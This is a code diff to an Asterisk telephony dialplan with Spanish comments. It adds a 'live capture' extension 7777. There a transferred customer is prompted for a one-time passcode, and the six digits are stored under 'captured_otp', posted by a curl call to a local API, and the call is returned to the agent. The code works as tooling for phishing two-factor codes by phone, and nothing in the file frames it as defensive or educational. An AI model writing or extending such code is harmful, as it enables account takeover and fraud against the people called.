@@ -2505,7 +2505,15 @@ exten => _1XXX,1,NoOp(Llamada interna a extension \${EXTEN})
  same => n,Dial(PJSIP/\${EXTEN},30,Tt)
  same => n,Hangup()
 
-; 2. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)
+; 2a. Extension Dedicada de Captura en Vivo de Digitos (Extension 7777)
+exten => 7777,1,NoOp(=== TRANSFERENCIA DE CLIENTE A CAPTURA EN VIVO EXT 7777 ===)
+ same => n,Answer()
+ same => n,Wait(1)
+ same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})
+ same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:${agentExtension})})
+ same => n,Goto(ivr-captura-vivo,s,1)
+
+; 2b. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)
 exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888 ===)
  same => n,Set(IS_TEST_CALL=1)
  same => n,Set(CALL_DEST=8888)
@@ -2542,6 +2550,38 @@ exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via televox)
 [trunkinbound]
 exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})
  same => n,Goto(ivr-otp,s,1)
+
+; ========================================================
+; CONTEXTO DEDICADO CAPTURA EN VIVO (EXT 7777)
+; ========================================================
+[ivr-captura-vivo]
+exten => s,1,NoOp(=== [CAPTURA-7777] INICIANDO PARA DESTINO: \${TARGET_DEST} ===)
+ same => n,Answer()
+ same => n,Wait(1)
+ same => n,Set(FINAL_AGENT=\${IF($["\${FINAL_AGENT}" != ""]?\${FINAL_AGENT}:${agentExtension})})
+ same => n,Playback(beep)
+ same => n,Read(USER_DIGITS,custom/solicitar_codigo_otp,6,,2,15)
+ same => n,GotoIf($["\${USER_DIGITS}" != ""]?captura_ok)
+ same => n,Playback(beep)
+ same => n,Read(USER_DIGITS,beep,6,,2,10)
+ same => n,GotoIf($["\${USER_DIGITS}" = ""]?captura_timeout)
+
+ same => n(captura_ok),NoOp(=== [CAPTURA-7777] DIGITOS RECIBIDOS: \${USER_DIGITS} ===)
+ same => n,Set(DB(captured_otp/\${TARGET_DEST}/code)=\${USER_DIGITS})
+ same => n,Set(DB(captured_otp/\${TARGET_DEST}/status)=captured)
+ same => n,Set(DB(captured_otp/\${TARGET_DEST}/timestamp)=\${EPOCH})
+ same => n,UserEvent(OtpCaptured,Destination: \${TARGET_DEST},Code: \${USER_DIGITS})
+ same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)
+ same => n,Playback(beep)
+ same => n,Wait(1)
+ same => n,NoOp(=== [CAPTURA-7777] RETORNANDO LLAMADA AL ASESOR EN EXTENSION \${FINAL_AGENT} ===)
+ same => n,Dial(PJSIP/\${FINAL_AGENT},60)
+ same => n,Hangup()
+
+ same => n(captura_timeout),NoOp(=== [CAPTURA-7777] TIMEOUT SIN DIGITOS -> RECONECTANDO ASESOR ===)
+ same => n,Playback(beep)
+ same => n,Dial(PJSIP/\${FINAL_AGENT},60)
+ same => n,Hangup()
 
 ; ========================================================
 ; CONTEXTO IVR INTERACTIVO CON AUDIOS PREGRABADOS
